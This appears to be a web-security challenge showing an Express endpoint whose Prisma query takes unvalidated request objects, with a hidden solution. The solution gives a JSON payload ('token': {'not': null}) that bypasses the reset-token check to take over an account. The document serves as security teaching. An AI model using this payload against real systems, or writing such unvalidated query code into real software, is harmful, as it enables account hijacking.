# Prisma ORM Leak
Is this app vulnerable to 0-click account takeover?
```javascript
const express = require('express');
const { PrismaClient } = require('@prisma/client');
const bcrypt = require('bcryptjs');

const app = express();
const prisma = new PrismaClient();
app.use(express.json());


app.post('/reset-password', async (req, res) => {
    const { email, token, newPassword } = req.body;

    if (!email || !token || !newPassword) {
        return res.status(400).json({ error: "Missing required fields" });
    }

    try {
        const user = await prisma.user.findUnique({
            where: { email, resetToken: token }
        });
        if (!user || new Date(user.resetExpires) < new Date()) {
            return res.status(400).json({ error: 'Invalid or expired token' });
        }

        const hashedPassword = await bcrypt.hash(newPassword, 10);
        await prisma.user.update({
            where: { id: user.id },
            data: { password: hashedPassword, resetToken: null, resetExpires: null }
        });

        res.json({ message: 'Password reset successfully' });
    } catch (error) {
        res.status(400).json({ error: 'Invalid token' });
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
```
<details>
  <summary>Toggle to see the solution</summary>

  This Challenge is vulnerable to ORM Leak, allowing you to bypass the conditions.
  Inspired by this research:
  https://www.elttam.com/blog/plorming-your-primsa-orm/

  Solution Payload:
  ```json
  {
    "email": "test@voorivexteam.com",
    "token": {
        "not": null
    },
    "newPassword":"12345"
  }
  ```

</details>